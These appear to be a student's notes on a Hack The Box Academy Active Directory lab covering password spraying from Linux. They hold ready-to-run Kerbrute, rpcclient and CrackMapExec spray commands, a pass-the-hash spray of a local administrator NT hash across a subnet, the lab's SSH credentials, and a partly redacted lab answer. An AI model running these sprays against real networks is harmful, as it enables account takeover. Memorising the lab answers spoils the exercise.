### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Internal Password Spraying: from Linux <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Internal Password Spraying: from Linux

`rpcclient` one-liner: successful logon prints `Authority Name`:

```diff
+ $ for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

<br>

`Kerbrute` spray:

```diff
+ $ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

<br>

`CrackMapExec` spray + filter to `+` (success):

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

<br>

Validate hits:

```diff
+ $ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

<br>

---

<br>

### Local Administrator Password Reuse

Spray local admin NT hash across the subnet: gold image / shared local-admin password. `--local-auth` = single login attempt per host (no domain lockout risk):

```diff
+ $ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

<br>

Variations to try:
- Same password pattern across naming schemes (`$desktop%@admin123` → `$server%@admin123`)
- Domain user + paired admin accounts (`ajones` / `ajones_adm`)
- Cross-domain reuse on trusts
- LAPS = the fix

<br>

---

<br>

### Internal Password Spraying Exercise

IP: 10.129.59.228

SSH `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

#### SSH in, build a "starts with s" user list via enum4linux + grep, then Kerbrute spray Welcome1.

```diff
+ $ ssh htb-student@10.129.59.228
+ $ enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" | grep -i "^s" > user.list
+ $ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 user.list Welcome1
```

	2025/12/09 14:38:07 >  [+] VALID LOGIN: sgage@inlanefreight.local:Welcome1

&#x1F6A9; found **sg--edit--**.
